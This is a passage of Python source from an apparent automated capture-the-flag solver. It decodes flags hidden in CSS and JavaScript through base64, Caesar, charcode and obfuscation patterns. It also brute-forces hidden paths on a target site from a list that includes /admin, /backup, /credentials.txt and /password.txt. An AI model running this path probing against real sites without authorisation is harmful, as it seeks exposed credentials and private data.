            fragments = [m[1] for m in payload_matches if m[1].strip()]
            if fragments:
                combined = ''.join(fragments)
                result.add_log(f"Found CSS payload fragments: {len(fragments)} parts")
                try:
                    decoded = base64.b64decode(combined).decode('utf-8', errors='ignore')
                    if decoded and len(decoded) >= 3:
                        result.add_log(f"CSS payload decoded: {decoded}")
                        # Skip if it's a decoy
                        if not any(x in decoded.lower() for x in ['decoy', 'fake', 'not_real']):
                            return decoded
                except:
                    pass
        
        # PRIORITY 1: Check for #payload or similar hidden flag patterns in CSS
        # Pattern like: #payload:(Flag: Bye Bye Captain)
        payload_patterns = [
            r'#payload[:\s]*\(?(?:Flag[:\s]*)?([^)}\n]+)\)?',
            r'#flag[:\s]*\(?([^)}\n]+)\)?',
            r'#secret[:\s]*\(?([^)}\n]+)\)?',
            r'/\*\s*flag[:\s]*([^*]+)\*/',
            r'/\*\s*Flag[:\s]*([^*]+)\*/',
            r'/\*\s*FLAG[:\s]*([^*]+)\*/',
            r'flag[:\s]*["\']([^"\']+)["\']',
            r'Flag[:\s]*["\']([^"\']+)["\']',
        ]
        
        # CSS section comment patterns to skip (false positives)
        css_section_patterns = [
            r'section', r'header', r'footer', r'button', r'modal', r'card',
            r'container', r'wrapper', r'layout', r'grid', r'flex', r'style',
            r'download', r'upload', r'form', r'input', r'navigation', r'nav',
            r'menu', r'sidebar', r'content', r'main', r'body', r'html',
        ]
        
        for pattern in payload_patterns:
            matches = re.findall(pattern, css_content, re.IGNORECASE)
            for match in matches:
                match = match.strip()
                if match and len(match) >= 3:
                    # Skip CSS section comments (like "Flag Download Section")
                    match_lower = match.lower()
                    if any(section in match_lower for section in css_section_patterns):
                        continue
                    # Skip if it looks like a CSS class/selector description
                    if match_lower.endswith('section') or match_lower.endswith('styles'):
                        continue
                    
                    result.add_log(f"Found CSS payload/flag: {match}")
                    # Check if it's a proper flag format
                    flag = self.extract_flag(match)
                    if flag:
                        return flag
                    # Return as-is if it looks like readable text
                    if CTFDecoder._looks_english(match) or len(match.split()) >= 2:
                        return match
        
        # Check for CSS variables with suspicious names (payload, flag, secret, etc.)
        css_var_pattern = r'--(?:payload|flag|secret|key|hidden|cipher|encoded|message)\s*:\s*["\']([^"\']+)["\']'
        css_vars = re.findall(css_var_pattern, css_content, re.IGNORECASE)
        for var_value in css_vars:
            result.add_log(f"Found CSS variable payload: {var_value[:50]}...")
            
            # Check if it's a standard flag
            flag = self.extract_flag(var_value)
            if flag:
                return flag
            
            # Try Caesar cipher decoding (check for version hints like v4)
            # Look for version hints in CSS content
            version_match = re.search(r'v(\d+)|version[:\s]*(\d+)|shift[:\s]*(\d+)', css_content, re.IGNORECASE)
            if version_match:
                shift = int(version_match.group(1) or version_match.group(2) or version_match.group(3))
                decoded = CTFDecoder.decode_caesar(var_value, shift)
                if decoded and CTFDecoder._looks_english(decoded):
                    result.add_log(f"CSS payload decoded (Caesar shift {shift}): {decoded}")
                    return decoded
            
            # If no version hint in CSS, try common shifts (especially 4 for "caesar" challenges)
            # Check if URL or content suggests Caesar cipher
            for shift in [4, 3, 13, 7, 1, 5, 6]:  # Common shifts, 4 first for caesar challenges
                decoded = CTFDecoder.decode_caesar(var_value, shift)
                if decoded and CTFDecoder._looks_english(decoded):
                    # Verify it's not gibberish by checking for multiple common words
                    words = decoded.lower().split()
                    common_words = ['house', 'window', 'door', 'room', 'floor', 'building', 
                                   'entrance', 'parking', 'court', 'front', 'back', 'side',
                                   'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
                                   'in', 'of', 'to', 'at', 'on', 'by', 'is', 'it']
                    word_matches = sum(1 for w in words if w in common_words)
                    if word_matches >= 1 or len(words) >= 2:
                        result.add_log(f"CSS payload decoded (Caesar shift {shift}): {decoded}")
                        return decoded
            
            # Try all decodings
            decoded_results = CTFDecoder.try_all_decodings(var_value, result.add_log)
            for decoded in decoded_results:
                flag = self.extract_flag(decoded)
                if flag:
                    return flag
                if CTFDecoder._looks_english(decoded):
                    return decoded
        
        # Find all CSS comments
        css_comments = re.findall(r'/\*(.*?)\*/', css_content, re.DOTALL)
        
        base64_fragments = []
        fragment_order = []
        
        for comment in css_comments:
            # Look for Fragment patterns like "Fragment 1: ZmxhZw=="
            fragment_match = re.search(r'Fragment\s*(\d+):\s*([A-Za-z0-9+/]{4,}={0,2})', comment)
            if fragment_match:
                frag_num = int(fragment_match.group(1))
                b64_data = fragment_match.group(2)
                try:
                    decoded = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
                    if decoded:
                        result.add_log(f"Fragment {frag_num}: {b64_data} -> {decoded}")
                        fragment_order.append((frag_num, decoded))
                except:
                    pass
            
            # Also look for standalone base64 patterns
            b64_matches = re.findall(r'(?<![A-Za-z0-9+/])([A-Za-z0-9+/]{8,}={0,2})(?![A-Za-z0-9+/])', comment)
            for match in b64_matches:
                if len(match) >= 8:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if decoded and len(decoded) > 0 and decoded not in [f[1] for f in fragment_order]:
                            result.add_log(f"Found base64 in CSS: {match} -> {decoded}")
                            base64_fragments.append(decoded)
                    except:
                        pass
            
            # Also check for direct flags in comments
            flag = self.extract_flag(comment)
            if flag:
                return flag
        
        # Sort fragments by number and combine
        if fragment_order:
            fragment_order.sort(key=lambda x: x[0])
            combined = ''.join([f[1] for f in fragment_order])
            result.add_log(f"Combined ordered fragments: {combined}")
            if '{' in combined and '}' in combined:
                return combined
            flag = self.extract_flag(combined)
            if flag:
                return flag
        
        # Try to combine unordered fragments
        if base64_fragments:
            combined = ''.join(base64_fragments)
            result.add_log(f"Combined CSS fragments: {combined}")
            if '{' in combined and '}' in combined:
                return combined
            flag = self.extract_flag(combined)
            if flag:
                return flag
        
        return None
    
    def _extract_base64_fragments(self, text: str, result: ChallengeResult) -> str:
        """Extract and combine base64 fragments from text"""
        b64_matches = re.findall(r'[A-Za-z0-9+/]{4,}={0,2}', text)
        fragments = []
        
        for match in b64_matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 0:
                    fragments.append(decoded)
            except:
                pass
        
        if fragments:
            combined = ''.join(fragments)
            if '{' in combined and '}' in combined:
                return combined
        
        return None
    
    def _discover_hidden_paths(self, url: str, result: ChallengeResult) -> str:
        """Discover hidden paths using ULTRA Path Finder"""
        result.add_log("Discovering hidden paths with ULTRA Path Finder...")
        
        # Try to use UltraPathFinder for comprehensive scanning
        try:
            from .pathfinder import UltraPathFinder
            
            finder = UltraPathFinder(session=self.session, timeout=5, max_threads=10, max_depth=2)
            
            def log_callback(msg):
                result.add_log(msg)
            
            # Run quick path discovery
            paths_result = finder.find_all_paths(url, callback=log_callback)
            
            result.add_log(f"Found {paths_result['total_paths']} total paths")
            
            # Check discovered paths for flags
            base_url = url.rstrip('/')
            
            # Check secrets first
            for secret in paths_result.get('secrets', []):
                if secret['type'] == 'Flag':
                    flag = self.extract_flag(secret['value'])
                    if flag:
                        result.add_log(f"Found flag in secrets: {flag}")
                        return flag
            
            # Check all discovered paths
            priority_paths = []
            
            # Prioritize CTF-related paths
            ctf_keywords = ['flag', 'secret', 'hidden', 'key', 'admin', 'morse', 'audio', 'challenge']
            for path in paths_result.get('paths', []):
                if any(kw in path.lower() for kw in ctf_keywords):
                    priority_paths.insert(0, path)
                else:
                    priority_paths.append(path)
            
            # Check priority paths first (limit to 50 for speed)
            for path in priority_paths[:50]:
                try:
                    test_url = base_url + path
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200:
                        # Check for flag
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log(f"Found flag at {path}")
                            return flag
                        
                        # Check for audio files (morse code)
                        if path.endswith(('.wav', '.mp3', '.ogg')):
                            result.add_log(f"Found audio file: {path}")
                            decoded = CTFDecoder.decode_morse_audio(response.content)
                            if decoded:
                                result.add_log(f"Decoded morse from audio: {decoded}")
                                return decoded
                        
                        # Check JSON responses
                        try:
                            data = response.json()
                            flag = self._search_json_for_flag(data, result)
                            if flag:
                                return flag
                        except:
                            pass
                except:
                    pass
            
            # Check forms for login pages
            for form in paths_result.get('forms', []):
                if 'login' in form['action'].lower() or 'password' in str(form['inputs']).lower():
                    result.add_log(f"Found login form: {form['action']}")
            
        except ImportError:
            result.add_log("UltraPathFinder not available, using basic discovery...")
        except Exception as e:
            result.add_log(f"PathFinder error: {e}, falling back to basic discovery...")
        
        # Fallback to basic hidden path discovery
        return self._basic_hidden_path_discovery(url, result)
    
    def _basic_hidden_path_discovery(self, url: str, result: ChallengeResult) -> str:
        """Basic hidden path discovery (fallback)"""
        
        # Comprehensive hidden CTF paths
        hidden_paths = [
            # Common CTF paths - most likely first
            '/flag', '/Flag', '/FLAG', '/secret', '/Secret', '/SECRET',
            '/hidden', '/Hidden', '/HIDDEN', '/key', '/Key', '/KEY',
            '/For Real', '/For%20Real', '/for-real', '/forreal',
            '/admin', '/private', '/mission', '/Mission', '/MISSION',
            '/challenge', '/step2', '/next', '/final', '/answer',
            '/clue', '/hint', '/puzzle', '/solve',
            '/.hidden', '/.secret', '/~secret', '/~admin',
            # More paths
            '/debug', '/test', '/dev', '/staging', '/backup',
            '/old', '/new', '/beta', '/alpha', '/internal',
            '/api/flag', '/api/secret', '/api/admin', '/api/key',
            '/static/flag.txt', '/static/secret.txt', '/files/flag.txt',
            '/download/flag', '/get/flag', '/fetch/flag',
            '/level2', '/level3', '/stage2', '/stage3', '/part2',
            '/source', '/src', '/code', '/app', '/main',
            '/login', '/register', '/dashboard', '/panel', '/console',
            '/config', '/settings', '/options', '/preferences',
            # File extensions
            '/flag.txt', '/flag.html', '/flag.php', '/flag.json',
            '/secret.txt', '/secret.html', '/secret.json',
            '/key.txt', '/password.txt', '/credentials.txt',
            # Audio/media files that might contain morse code
            '/morse.wav', '/morse.mp3', '/audio.wav', '/signal.wav',
            '/code.wav', '/message.wav', '/flag.wav',
            # Netlify functions
            '/.netlify/functions/flag', '/.netlify/functions/secret',
            '/.netlify/functions/getFlag', '/.netlify/functions/submit',
        ]
        
        base_url = url.rstrip('/')
        
        for path in hidden_paths:
            try:
                test_url = base_url + path
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 50:
                    result.add_log(f"Found hidden path: {path}")
                    
                    # Check for flag in response
                    flag = self.extract_flag(response.text)
                    if flag and '{' in flag and '}' in flag:
                        if flag.count('{') == flag.count('}'):
                            result.add_log(f"Found flag at {path}")
                            return flag
                    
                    # Try to parse JSON response
                    try:
                        data = response.json()
                        flag = self._search_json_for_flag(data, result)
                        if flag:
                            result.add_log(f"Found flag in JSON at {path}")
                            return flag
                    except:
                        pass
                    
                    # Parse the hidden page for more clues
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Check inline styles (base64 fragments often hidden here)
                    style_tags = soup.find_all('style')
                    for style in style_tags:
                        if style.string:
                            flag = self._extract_css_secrets(style.string, result)
                            if flag:
                                return flag
                    
                    # Check CSS files on hidden page
                    for link in soup.find_all('link', rel='stylesheet'):
                        href = link.get('href')
                        if href:
                            try:
                                css_url = urljoin(test_url, href)
                                css_response = self.session.get(css_url, timeout=5)
                                if css_response.status_code == 200:
                                    flag = self._extract_css_secrets(css_response.text, result)
                                    if flag:
                                        return flag
                            except:
                                pass
                    
                    # Check HTML comments on hidden page
                    html_comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
                    base64_fragments = []
                    for comment in html_comments:
                        b64_matches = re.findall(r'[A-Za-z0-9+/]{4,}={0,2}', comment)
                        for match in b64_matches:
                            try:
                                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                                if decoded:
                                    result.add_log(f"Found base64 fragment: {decoded}")
                                    base64_fragments.append(decoded)
                            except:
                                pass
                    
                    if base64_fragments:
                        combined = ''.join(base64_fragments)
                        result.add_log(f"Combined fragments: {combined}")
                        if '{' in combined and '}' in combined:
                            return combined
                    
                    # Check for JS files on hidden page
                    for script in soup.find_all('script', src=True):
                        try:
                            js_url = urljoin(test_url, script['src'])
                            js_response = self.session.get(js_url, timeout=5)
                            if js_response.status_code == 200:
                                flag = self._extract_js_secrets(js_response.text, result)
                                if flag:
                                    return flag
                                # Also check for hints
                                hint_flag = self._extract_js_hints(js_response.text, result)
                                if hint_flag:
                                    return hint_flag
                        except:
                            pass
                    
                    # Check for audio files (morse code challenges)
                    audio_tags = soup.find_all(['audio', 'source'])
                    for audio in audio_tags:
                        src = audio.get('src')
                        if src:
                            result.add_log(f"Found audio file: {src}")
                            audio_url = urljoin(test_url, src)
                            
                            # Try to download and decode audio morse code
                            try:
                                audio_response = self.session.get(audio_url, timeout=15)
                                if audio_response.status_code == 200:
                                    result.add_log(f"Downloaded audio file ({len(audio_response.content)} bytes)")
                                    decoded = CTFDecoder.decode_morse_audio(audio_response.content)
                                    if decoded:
                                        result.add_log(f"Decoded morse from audio: {decoded}")
                                        return decoded
                            except Exception as e:
                                result.add_log(f"Error decoding audio: {e}")
                            
                            # Also try text version as fallback
                            txt_url = audio_url.replace('.wav', '.txt').replace('.mp3', '.txt')
                            try:
                                txt_response = self.session.get(txt_url, timeout=5)
                                if txt_response.status_code == 200:
                                    flag = self.extract_flag(txt_response.text)
                                    if flag:
                                        return flag
                                    # Try morse decode
                                    decoded = CTFDecoder.decode_morse(txt_response.text.strip())
                                    if decoded:
                                        result.add_log(f"Decoded morse from text: {decoded}")
                                        return decoded
                            except:
                                pass
                    
                    # Check inline scripts for hints
                    for script in soup.find_all('script'):
                        if script.string:
                            hint_flag = self._extract_js_hints(script.string, result)
                            if hint_flag:
                                return hint_flag
            except:
                pass
        
        return None
    
    def _is_decoy_flag(self, value: str, js_content: str = "") -> bool:
        """Check if a value is a decoy/fake flag or a false positive"""
        if not value:
            return True
            
        value_lower = value.lower().strip()
        
        # Skip very short values (less than 4 chars) - not meaningful flags
        if len(value_lower) < 4:
            return True
        
        # Skip placeholder/example flags
        placeholder_patterns = [
            r'your_discovered_flag', r'your_flag', r'your_flag_here',
            r'flag_here', r'insert_flag', r'put_flag', r'enter_flag',
            r'example_flag', r'sample_flag', r'placeholder',
            r'xxx+', r'yyy+', r'zzz+', r'\*\*\*', r'\.\.\.+',
            r'flag\{[a-z_]*here[a-z_]*\}', r'flag\{[a-z_]*example[a-z_]*\}',
            r'flag\{[a-z_]*your[a-z_]*\}', r'flag\{[a-z_]*insert[a-z_]*\}',
            r'flag\{[a-z_]*placeholder[a-z_]*\}',
        ]
        for pattern in placeholder_patterns:
            if re.search(pattern, value_lower):
                return True
        
        # Skip common JavaScript/CSS boolean and simple values
        simple_values = [
            'true', 'false', 'null', 'undefined', 'none', 'auto', 'inherit',
            'initial', 'unset', 'normal', 'hidden', 'visible', 'block', 'inline',
            'flex', 'grid', 'absolute', 'relative', 'fixed', 'static', 'sticky',
            'left', 'right', 'center', 'top', 'bottom', 'middle', 'baseline',
            'solid', 'dashed', 'dotted', 'double', 'groove', 'ridge', 'inset',
            'outset', 'transparent', 'currentcolor', 'pointer', 'default',
            'text', 'password', 'submit', 'button', 'checkbox', 'radio',
            'function', 'object', 'string', 'number', 'boolean', 'array',
            'error', 'success', 'warning', 'info', 'debug', 'loading',
            'enabled', 'disabled', 'active', 'inactive', 'selected', 'checked',
            'open', 'closed', 'show', 'hide', 'toggle', 'click', 'hover',
            'focus', 'blur', 'change', 'input', 'submit', 'reset', 'scroll',
            'resize', 'load', 'unload', 'ready', 'complete', 'pending',
        ]
        if value_lower in simple_values:
            return True
        
        # Skip Atbash-decoded simple values (e.g., "true" -> "gifv")
        atbash_false_positives = [
            'gifv',  # Atbash of "true"
            'uzohy', # Atbash of "false"
            'mfoo',  # Atbash of "null"
        ]
        if value_lower in atbash_false_positives:
            return True
        
        # Skip values that are just repeated characters or patterns
        if len(set(value_lower)) <= 2:  # Only 1-2 unique chars
            return True
        
        # Skip common CSS class names and Tailwind patterns
        css_patterns = [
            r'^[a-z]+-[a-z]+$',  # e.g., "flex-row", "text-center"
            r'^[a-z]+\d+$',      # e.g., "p4", "m2", "w100"
            r'^#[0-9a-f]{3,8}$', # hex colors
            r'^\d+px$',          # pixel values
            r'^\d+%$',           # percentage values
            r'^\d+rem$',         # rem values
            r'^\d+em$',          # em values
        ]
        for pattern in css_patterns:
            if re.match(pattern, value_lower):
                return True
        
        # Check for obvious decoy patterns in the value itself
        decoy_patterns = [
            r'^fake\{', r'^decoy\{', r'^test\{', r'^false\{', r'^wrong\{',
            r'^not_the_', r'^red_herring', r'^misdirection',
            r'not_real', r'not_the_real', r'keep_looking', r'nice_try',
            r'wrong_direction', r'this_is_a_decoy', r'this_is_not',
            r'console_decoy', r'decoy_flag', r'fake_flag', r'css_comment_fake',
            r'environment_flag', r'backup_flag', r'legacy_flag',
            r'another_fake', r'fake\s+flag', r'this\s+is\s+.*fake',
            r'^this\s+is\s+another', r'^fake\s+flag', r'^another\s+fake',
            # Placeholder patterns
            r'your_discovered', r'discovered_flag', r'your_flag',
            r'flag_goes_here', r'put_your', r'enter_your', r'submit_your',
            r'example:', r'e\.g\.', r'for\s+example',
        ]
        for pattern in decoy_patterns:
            if re.search(pattern, value_lower):
                return True
        
        # Check if the value is directly assigned to a decoy variable
        # Only check if the value is directly in a decoy assignment
        escaped_value = re.escape(value)
        decoy_var_patterns = [
            r'(?:const|let|var)\s+(?:fake|decoy|false|wrong)_?\w*\s*=\s*[\'"]' + escaped_value + r'[\'"]',
            r'window\.FLAG\s*=\s*[\'"]' + escaped_value + r'[\'"]',
        ]
        for pattern in decoy_var_patterns:
            if re.search(pattern, js_content, re.IGNORECASE):
                return True
        
        # Check if decoded base64 reveals a decoy
        try:
            decoded = CTFDecoder.decode_base64(value)
            if decoded:
                decoded_lower = decoded.lower()
                if any(x in decoded_lower for x in ['fake{', 'decoy{', 'test{', 'false{', 'not_the_real', 'not_real']):
                    return True
        except:
            pass
        
        return False
    
    def _extract_real_flag_from_functions(self, js_content: str, result: ChallengeResult) -> str:
        """Extract real flag from function bodies like decodePayload()"""
        
        # PRIORITY 1: Look for explicit "Final answer" comments
        final_answer_patterns = [
            r'//\s*Final\s*answer[:\s]*["\']([^"\']+)["\']',
            r'//\s*(?:The\s+)?(?:real|actual)\s*(?:flag|answer|location)[:\s]*["\']([^"\']+)["\']',
            r'/\*[^*]*Final\s*answer[:\s]*["\']?([^"\'*\n]+)["\']?',
        ]
        
        for pattern in final_answer_patterns:
            match = re.search(pattern, js_content, re.IGNORECASE)
            if match:
                answer = match.group(1).strip()
                if len(answer) > 5 and not self._is_decoy_flag(answer, js_content):
                    result.add_log(f"Found final answer in comment: {answer}")
                    return answer
        
        # PRIORITY 2: Look for addOutput with success messages containing the flag
        success_output_patterns = [
            r"addOutput\s*\(\s*['\"]Target\s*Location[:\s]*([^'\"]+)['\"]",
            r"addOutput\s*\(\s*['\"]([^'\"]*(?:floor|building|room|entrance|parking|box|shed|court|campus)[^'\"]*)['\"]",
            r"this\.addOutput\s*\(\s*['\"]Target\s*Location[:\s]*([^'\"]+)['\"]",
        ]
        
        for pattern in success_output_patterns:
            match = re.search(pattern, js_content, re.IGNORECASE)
            if match:
                answer = match.group(1).strip()
                if len(answer) > 5 and not self._is_decoy_flag(answer, js_content):
                    result.add_log(f"Found target location in output: {answer}")
                    return answer
        
        # PRIORITY 3: Look for target location patterns in function outputs
        target_patterns = [
            r'Target\s*Location[:\s]+([a-zA-Z0-9\s]+(?:floor|building|room|entrance|parking|box|shed|court|campus)[a-zA-Z0-9\s]*)',
            r'FLAG[:\s]+([a-zA-Z0-9\s_]+)',
            r'MISSION\s*ACCOMPLISHED[!\s]*([a-zA-Z0-9\s_]+)',
        ]
        
        for pattern in target_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                match = match.strip()
                if len(match) > 5 and not self._is_decoy_flag(match, js_content):
                    # Check if it looks like a real location/answer
                    if any(word in match.lower() for word in ['floor', 'building', 'room', 'entrance', 'parking', 'box', 'shed', 'court', 'campus', 'university']):
                        result.add_log(f"Found target location: {match}")
                        return match
        
        # PRIORITY 4: Look for payloadData or similar objects with the real answer
        payload_patterns = [
            r'payloadData\s*=\s*\{[^}]*(?:answer|final|target|location)[:\s]*[\'"]([^\'"]+)[\'"]',
        ]
        
        for pattern in payload_patterns:
            match = re.search(pattern, js_content, re.IGNORECASE)
            if match:
                answer = match.group(1).strip()
                if len(answer) > 5 and not self._is_decoy_flag(answer, js_content):
                    result.add_log(f"Found payload answer: {answer}")
                    return answer
        
        return None
    
    def _extract_js_secrets(self, js_content: str, result: ChallengeResult) -> str:
        """Extract hidden flags, secrets, and encoded data from JavaScript"""
        
        # PRIORITY 0: Check JS comments for explicit flag mentions
        # Pattern: "Decodes to: FLAG{...}" or "Flag: FLAG{...}" in comments
        comment_flag_patterns = [
            r'//[^\n]*(?:Decodes?\s*to|Flag|flag|SECRET|secret)[:\s]*(\w+\{[^}]+\})',
            r'/\*[^*]*(?:Decodes?\s*to|Flag|flag|SECRET|secret)[:\s]*(\w+\{[^}]+\})',
            r'//[^\n]*:\s*(\w+\{[^}]+\})',
        ]
        
        for pattern in comment_flag_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                if '{' in match and '}' in match:
                    # Validate it's a proper flag format
                    flag = self.extract_flag(match)
                    if flag:
                        result.add_log(f"Found flag in JS comment: {flag}")
                        return flag
        
        # PRIORITY 0.5: Look for String.fromCharCode obfuscation (very common in CTF)
        charcode_flag = self._decode_string_from_charcode(js_content, result)
        if charcode_flag:
            return charcode_flag
        
        # PRIORITY 1: Look for real flag in function outputs (like decodePayload)
        real_flag = self._extract_real_flag_from_functions(js_content, result)
        if real_flag:
            return real_flag
        
        # PRIORITY 2: Look for Caesar cipher patterns EARLY (common in CTF)
        caesar_result = self._detect_caesar_cipher(js_content, result)
        if caesar_result:
            return caesar_result
        
        # PRIORITY 3: Look for hidden variables with flag-like names (but skip decoys)
        secret_patterns = [
            r'(?:hidden|secret|flag|key|password|token|answer)(?:Flag|Key|Value|Data)?\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'const\s+(?:hidden|secret|flag|key)\w*\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'var\s+(?:hidden|secret|flag|key)\w*\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'let\s+(?:hidden|secret|flag|key)\w*\s*=\s*[\'"]([^\'"]+)[\'"]',
        ]
        
        for pattern in secret_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                # Skip decoy flags
                if self._is_decoy_flag(match, js_content):
                    result.add_log(f"Skipping decoy: {match[:30]}...")
                    continue
                
                result.add_log(f"Found hidden variable: {match[:50]}...")
                
                # Try all CTF decodings using the comprehensive decoder
                decoded_results = CTFDecoder.try_all_decodings(match, result.add_log)
                for decoded in decoded_results:
                    # Skip decoded decoys
                    if self._is_decoy_flag(decoded, js_content):
                        continue
                    flag = self.extract_flag(decoded)
                    if flag and not self._is_decoy_flag(flag, js_content):
                        return flag
                    if CTFDecoder._looks_english(decoded) and not self._is_decoy_flag(decoded, js_content):
                        return decoded
                
                # Check if it's a standard flag format
                flag = self.extract_flag(match)
                if flag and not self._is_decoy_flag(flag, js_content):
                    return flag
        
        # Look for any encoded strings and try to decode them (skip decoys)
        encoded_result = self._find_and_decode_strings(js_content, result)
        if encoded_result and not self._is_decoy_flag(encoded_result, js_content):
            return encoded_result
        
        return None
    
    def _decode_string_from_charcode(self, js_content: str, result: ChallengeResult) -> str:
        """Decode String.fromCharCode obfuscation patterns"""
        # Pattern 1: String.fromCharCode(num, num, num, ...)
        charcode_pattern = r'String\.fromCharCode\s*\(\s*([\d,\s]+)\s*\)'
        matches = re.findall(charcode_pattern, js_content)
        
        decoded_parts = []
        for match in matches:
            try:
                # Parse the numbers
                nums = [int(n.strip()) for n in match.split(',') if n.strip().isdigit()]
                if nums:
                    decoded = ''.join(chr(n) for n in nums if 0 <= n <= 127)
                    if decoded:
                        decoded_parts.append(decoded)
            except:
                pass
        
        if decoded_parts:
            # Try to find a flag pattern in the combined decoded parts
            combined = ''.join(decoded_parts)
            result.add_log(f"Decoded String.fromCharCode: {combined[:50]}...")
            
            # Check if it forms a flag
            flag = self.extract_flag(combined)
            if flag:
                result.add_log(f"Found obfuscated flag: {flag}")
                return flag
            
            # Check if parts array is used to build a flag
            # Look for patterns like: parts.join('') or parts.join("")
            if 'parts' in js_content.lower() and '.join' in js_content:
                result.add_log(f"Found parts array flag: {combined}")
                return combined
        
        # Pattern 2: Array of String.fromCharCode in a function
        # Look for functions that return joined charcode arrays
        func_pattern = r'function\s+\w*(?:flag|secret|key|get\w*flag)\w*\s*\([^)]*\)\s*\{([^}]+)\}'
        func_matches = re.findall(func_pattern, js_content, re.IGNORECASE)
        
        for func_body in func_matches:
            # Find all String.fromCharCode in this function
            inner_matches = re.findall(charcode_pattern, func_body)
            if inner_matches:
                parts = []
                for match in inner_matches:
                    try:
                        nums = [int(n.strip()) for n in match.split(',') if n.strip().isdigit()]
                        if nums:
                            decoded = ''.join(chr(n) for n in nums if 0 <= n <= 127)
                            parts.append(decoded)
                    except:
                        pass
                
                if parts:
                    combined = ''.join(parts)
                    flag = self.extract_flag(combined)
                    if flag:
                        result.add_log(f"Found flag in obfuscated function: {flag}")
                        return flag
                    # If it looks like a flag format, return it
                    if '{' in combined and '}' in combined:
                        result.add_log(f"Found obfuscated flag: {combined}")
                        return combined
        
        # Pattern 3: Look for eval or Function with encoded strings
        eval_pattern = r'(?:eval|Function)\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)'
        eval_matches = re.findall(eval_pattern, js_content)
        for match in eval_matches:
            # Try to decode various encodings
            decoded = CTFDecoder.decode_base64(match)
            if decoded:
                flag = self.extract_flag(decoded)
                if flag:
                    result.add_log(f"Found flag in eval: {flag}")
                    return flag
        
        # Pattern 4: Hex escape sequences like \x66\x6c\x61\x67
        hex_escape_pattern = r'[\'"]((\\x[0-9a-fA-F]{2})+)[\'"]'
        hex_matches = re.findall(hex_escape_pattern, js_content)
        for match in hex_matches:
            if isinstance(match, tuple):
                match = match[0]
            try:
                # Decode hex escapes
                decoded = bytes.fromhex(match.replace('\\x', '')).decode('utf-8', errors='ignore')
                if decoded:
                    flag = self.extract_flag(decoded)
                    if flag:
                        result.add_log(f"Found hex-escaped flag: {flag}")
                        return flag
            except:
                pass
        
        # Pattern 5: Unicode escape sequences like \u0066\u006c\u0061\u0067
        unicode_pattern = r'[\'"]((\\u[0-9a-fA-F]{4})+)[\'"]'
        unicode_matches = re.findall(unicode_pattern, js_content)
        for match in unicode_matches:
            if isinstance(match, tuple):
                match = match[0]
            try:
                decoded = match.encode().decode('unicode_escape')
                if decoded:
                    flag = self.extract_flag(decoded)
                    if flag:
                        result.add_log(f"Found unicode-escaped flag: {flag}")
                        return flag
            except:
                pass
        
        # Pattern 6: Octal escape sequences
        octal_pattern = r'[\'"]((\\[0-7]{3})+)[\'"]'
        octal_matches = re.findall(octal_pattern, js_content)
        for match in octal_matches:
            if isinstance(match, tuple):
                match = match[0]
            try:
                decoded = match.encode().decode('unicode_escape')
                if decoded:
                    flag = self.extract_flag(decoded)
                    if flag:
                        result.add_log(f"Found octal-escaped flag: {flag}")
                        return flag
            except:
                pass
        
        # Pattern 7: Array.from with charCode mapping
        array_from_pattern = r'Array\.from\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)'
        array_matches = re.findall(array_from_pattern, js_content)
        for match in array_matches:
            flag = self.extract_flag(match)
            if flag:
                result.add_log(f"Found flag in Array.from: {flag}")
                return flag
        
        # Pattern 8: Split and map with charCodeAt
        split_map_pattern = r'\.split\s*\(\s*[\'"][\'"]?\s*\)\s*\.map\s*\([^)]*charCodeAt'
        if re.search(split_map_pattern, js_content):
            # Look for the source string
            source_pattern = r'[\'"]([^\'"]{10,})[\'"]\.split'
            source_matches = re.findall(source_pattern, js_content)
            for source in source_matches:
                flag = self.extract_flag(source)
                if flag:
                    result.add_log(f"Found flag in split/map: {flag}")
                    return flag
        
        # Pattern 9: Packed JavaScript (Dean Edwards packer)
        packed_result = CTFDecoder.decode_packed_js(js_content)
        if packed_result:
            result.add_log(f"Unpacked JavaScript code")
            flag = self.extract_flag(packed_result)
            if flag:
                result.add_log(f"Found flag in packed JS: {flag}")
                return flag
            # Recursively check unpacked code
            inner_flag = self._decode_string_from_charcode(packed_result, result)
            if inner_flag:
                return inner_flag
        
        # Pattern 10: atob() calls (base64 decode in JS)
        atob_pattern = r'atob\s*\(\s*[\'"]([A-Za-z0-9+/=]+)[\'"]\s*\)'
        atob_matches = re.findall(atob_pattern, js_content)
        for match in atob_matches:
            decoded = CTFDecoder.decode_base64(match)
            if decoded:
                flag = self.extract_flag(decoded)
                if flag:
                    result.add_log(f"Found flag in atob: {flag}")
                    return flag
        
        # Pattern 11: decodeURIComponent with encoded strings
        decode_uri_pattern = r'decodeURIComponent\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)'
        uri_matches = re.findall(decode_uri_pattern, js_content)
        for match in uri_matches:
            decoded = CTFDecoder.decode_url(match)
            if decoded:
                flag = self.extract_flag(decoded)
                if flag:
                    result.add_log(f"Found flag in decodeURIComponent: {flag}")
                    return flag
        
        # Pattern 12: Obfuscator.io style (_0x variables)
        obfuscator_pattern = r'var\s+(_0x[a-f0-9]+)\s*=\s*\[([^\]]+)\]'
        obf_matches = re.findall(obfuscator_pattern, js_content)
        for var_name, array_content in obf_matches:
            # Extract strings from the array
            strings = re.findall(r'[\'"]([^\'"]+)[\'"]', array_content)
            for s in strings:
                # Try decoding
                decoded = CTFDecoder.decode_base64(s)
                if decoded:
                    flag = self.extract_flag(decoded)
                    if flag:
